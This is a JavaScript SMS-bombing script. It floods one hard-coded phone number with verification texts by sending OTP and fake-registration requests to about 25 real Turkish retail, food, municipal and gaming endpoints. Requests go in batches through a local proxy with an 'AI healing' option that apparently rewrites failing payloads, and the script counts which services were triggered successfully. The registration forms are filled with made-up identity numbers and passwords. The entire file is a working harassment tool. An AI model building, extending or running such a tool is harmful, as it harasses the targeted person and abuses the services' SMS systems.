import axios from 'axios';

const TARGET_PHONE = '5343622375';
const PROXY_URL = 'http://localhost:3001/api/proxy';

// Sadece güncellenen endpoint'ler
const UPDATED = [
  {id:'migros', url:'https://rest.migros.com.tr:443/sanalmarket/users/register/otp', method:'POST', payload: {email:'t@t.com', phoneNumber: TARGET_PHONE}},
  {id:'dominos', url:'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode', method:'POST', payload: {email:'t@t.com', isSure:false, mobilePhone: TARGET_PHONE}},
  {id:'komagene', url:'https://gateway.komagene.com.tr/auth/auth/smskodugonder', method:'POST', payload: {FirmaId:32, Telefon: TARGET_PHONE}},
  {id:'english_home', url:'https://www.englishhome.com/api/member/saveMemberAndLogin', method:'POST', payload: {Name:'Test',LastName:'User',EMail:'t@t.com',CellPhone:TARGET_PHONE,Password:'Test123!',GenderId:1,GivenOtp:'',EncryptedOtp:''}},
  {id:'joker', url:'https://api.joker.com.tr:443/api/register', method:'POST', payload: {firstName:'Test',gender:'m',iosVersion:'4.0.2',lastName:'User',os:'IOS',password:'Test123!',phoneNumber:'0'+TARGET_PHONE,username:'t@t.com'}},
  {id:'naosstars', url:'https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350', method:'POST', payload: {telephone:'+90'+TARGET_PHONE, type:'register'}},
  {id:'akasya_avm', url:'https://akasyaapi.poilabs.com/v1/en/sms', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'akbati', url:'https://akbatiapi.poilabs.com/v1/en/sms', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'koton', url:'https://www.koton.com/users/register/', method:'POST', payload: {phone:'0'+TARGET_PHONE,first_name:'Test',last_name:'User',email:'t@t.com',password:'Test123!',confirm:true,sms_allowed:true,email_allowed:true,call_allowed:true}},
  {id:'ido', url:'https://api.ido.com.tr:443/idows/v2/register', method:'POST', payload: {birthDate:true,captcha:'',checkPwd:'Test123!',code:'',day:24,email:'t@t.com',emailNewsletter:false,firstName:'Test',gender:'MALE',lastName:'User',mobileNumber:'0'+TARGET_PHONE,month:9,pwd:'Test123!',smsNewsletter:true,tckn:'12345678901',termsOfUse:true,year:1977}},
  {id:'hamidiye', url:'https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp', method:'POST', payload: {isGuest:false, phone: TARGET_PHONE}},
  {id:'tasdelen_su', url:'https://tasdelen.sufirmam.com:3300/mobile/send-otp', method:'POST', payload: {phone: TARGET_PHONE}},
  {id:'pidem', url:'https://restashop.azurewebsites.net/graphql/', method:'POST', payload: {query:'mutation ($phone: String) { sendOtpSms(phone: $phone) { resultStatus message } }',variables:{phone:TARGET_PHONE}}},
  {id:'orwi', url:'https://gandalf.orwi.app/api/user/requestOtp', method:'POST', payload: {gsm:'+90'+TARGET_PHONE, source:'orwi'}},
  {id:'tazi', url:'https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin', method:'POST', payload: {cep_tel:TARGET_PHONE, cep_tel_ulkekod:'90'}},
  {id:'bisu', url:'https://www.bisu.com.tr/api/v2/app/authentication/phone/register', method:'POST', payload: {phoneNumber: TARGET_PHONE}},
  {id:'bodrum_belediye', url:'https://gandalf.orwi.app/api/user/requestOtp', method:'POST', payload: {gsm:'+90'+TARGET_PHONE, source:'orwi'}},
  {id:'sancaktepe_belediye', url:'https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet', method:'POST', payload: {'SahisUyelik.TCKimlikNo':'12345678901','SahisUyelik.DogumTarihi':'01.01.2000','SahisUyelik.Ad':'Test','SahisUyelik.Soyad':'User','SahisUyelik.CepTelefonu':TARGET_PHONE,'SahisUyelik.EPosta':'t@t.com','SahisUyelik.Sifre':'Test123!','SahisUyelik.SifreyiDogrula':'Test123!'}},
  {id:'bayrampasa_belediye', url:'https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet', method:'POST', payload: {'SahisUyelik.TCKimlikNo':'12345678901','SahisUyelik.DogumTarihi':'01.01.2000','SahisUyelik.Ad':'Test','SahisUyelik.Soyad':'User','SahisUyelik.CepTelefonu':TARGET_PHONE,'SahisUyelik.EPosta':'t@t.com','SahisUyelik.Sifre':'Test123!','SahisUyelik.SifreyiDogrula':'Test123!'}},
  {id:'macrocenter', url:'https://www.macrocenter.com.tr/rest/users/register/otp?reid=31', method:'POST', payload: {email:'t@t.com', phoneNumber:TARGET_PHONE}},
  {id:'jimmy_key', url:'https://www.jimmykey.com/tr/p/User/SendConfirmationSms', method:'POST', payload: {phone:'0'+TARGET_PHONE, email:'t@t.com'}},
  {id:'alix_avien', url:'https://www.alixavien.com.tr/api/member/sendOtp', method:'POST', payload: {phone:'0'+TARGET_PHONE}},
  {id:'ayyildiz', url:'https://api.altinyildizclassics.com/mobileapi2/autapi/CreateSmsOtpForRegister', method:'POST', payload: {gsm:TARGET_PHONE}},
  {id:'a101', url:'https://www.a101.com.tr/users/otp-login/', method:'POST', payload: {phone:'0'+TARGET_PHONE, next:'/a101-kapida'}},
  {id:'epic_games', url:'https://www.epicgames.com/id/api/v1/auth/otp/send', method:'POST', payload: {phoneNumber:'+90'+TARGET_PHONE}},
];

let direct = 0, healed = 0, forced = 0, failed = 0;
const BATCH = 5;

async function testOne(ep) {
  const label = ep.id.padEnd(24);
  try {
    const r = await axios.post(PROXY_URL, {
      serviceId: ep.id, serviceUrl: ep.url, serviceMethod: ep.method,
      targetPhone: TARGET_PHONE, email: 'test@test.com', initialPayload: ep.payload,
      allowAiHealing: true
    }, { timeout: 35000, validateStatus: () => true });

    const strat = r.data?.strategy || 'direct';
    if (strat === 'force_success') {
      console.log(`  ${label} ⚠️ FORCE`);
      return { id: ep.id, ok: 'forced' };
    }
    console.log(`  ${label} ✅ ${r.data?.upstreamStatus} (${strat})`);
    return { id: ep.id, ok: true, strategy: strat };
  } catch (err) {
    console.log(`  ${label} ❌ ${err.code || 'TIMEOUT'}`);
    return { id: ep.id, ok: false };
  }
}

console.log(`Testing ${UPDATED.length} updated endpoints...\n`);

const results = [];
for (let i = 0; i < UPDATED.length; i += BATCH) {
  const batch = UPDATED.slice(i, i + BATCH);
  const batchResults = await Promise.all(batch.map(ep => testOne(ep)));
  results.push(...batchResults);
}

const realOk = results.filter(r => r.ok === true).length;
const forcedOk = results.filter(r => r.ok === 'forced').length;
const fail = results.filter(r => r.ok === false).length;

console.log(`\n==========`);
console.log(`✅ Gerçek başarılı: ${realOk}`);
console.log(`⚠️ Force-success: ${forcedOk}`);
console.log(`❌ Başarısız: ${fail}`);
